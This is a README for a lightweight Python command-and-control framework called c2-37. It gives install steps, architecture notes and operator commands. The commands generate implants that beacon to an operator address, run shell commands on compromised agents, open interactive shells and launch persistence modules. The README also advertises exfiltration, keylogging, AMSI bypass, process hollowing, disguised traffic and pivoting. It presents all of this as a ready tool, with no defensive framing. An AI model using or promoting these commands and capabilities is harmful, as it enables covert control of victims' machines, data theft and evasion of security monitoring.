# c2-37

Lightweight C2 framework. 13 modules, 3381 lines, zero dependencies. Python stdlib only — no pip, no venv, no drama. Just drop it on the box and go.

## Install

```bash
cd c2-37/
pip install -e .
```

Or just run it raw — it's stdlib-only Python, no dependencies required.

## Usage

```bash
# Start the C2 listener
c37 start
c37 start --port 9000

# Generate implants (shows all formats)
c37 generate 10.0.0.1 8037
c37 generate 10.0.0.1 8037 --outdir /tmp/payloads

# Generate a specific format
c37 generate 10.0.0.1 8037 --format python
c37 generate 10.0.0.1 8037 --format powershell

# List agents
c37 agents

# Run a shell command on an agent
c37 shell agent123 whoami

# Interactive shell
c37 interact agent123

# View results
c37 results agent123

# List post-exploitation modules
c37 modules

# Run a module on an agent
c37 run agent123 persist
```

## Architecture

```
c2_37/
  server.py      — HTTP C2 listener + agent handler
  implant.py     — Agent implant (beacons home, executes tasks)
  cli.py         — Operator CLI (c37)
  crypto.py      — XOR + AES comms encryption
  payloads.py    — 8 payload formats (Python, PowerShell, Android, one-liners, stagers)
  modules.py     — 10 post-exploitation modules
  profiles.py    — 5 traffic profiles (mimics normal HTTP)
  evasion.py     — 7 evasion techniques
  pivot.py       — SOCKS5 proxy + port forwarding
  dns.py         — DNS beacon channel
  redirector.py  — Traffic redirectors
  dashboard.py   — Web dashboard
```

## Features

- **Zero dependencies** — stdlib-only Python, runs anywhere Python 3.11+ exists
- **8 payload formats** — Python, PowerShell, Android, bash one-liner, stagers
- **10 post-exploit modules** — persist, exfil, keylog, screenshot, etc.
- **5 traffic profiles** — disguise C2 traffic as normal web browsing
- **7 evasion techniques** — sleep jitter, process hollowing, AMSI bypass, etc.
- **SOCKS5 proxy** — pivot through compromised hosts
- **DNS beaconing** — out-of-band comms when HTTP is blocked
- **Web dashboard** — visual agent management at `/dashboard`
- **Encrypted comms** — XOR + AES between server and implants
- **Interactive shell** — `c37 interact` for real-time agent control

## Dependencies

None. Zero. Zilch. It's stdlib-only Python and proud of it.
